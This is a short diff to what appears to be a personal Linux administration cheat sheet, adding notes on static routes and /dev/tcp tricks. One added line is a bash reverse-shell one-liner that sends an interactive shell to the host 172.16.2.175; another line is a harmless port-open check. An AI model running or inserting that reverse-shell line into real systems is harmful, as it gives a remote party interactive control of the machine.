@@ -4,3 +4,12 @@ Mount File System in Single user Mode
 Adding a static route to a different subnet that cannot be accessed through your default gateway.
 
 ip route add 172.16.5.0/24 via 172.20.5.50 dev eth0
+
+Linux on any Port
+
+bash -i >& /dev/tcp/172.16.2.175/portno 0>&1
+
+#Cehck if port is open or Closed
+
+(echo > /dev/tcp/localhost/6667) >/dev/null 2>&1     && echo "Open"		|| echo "Closed"
+
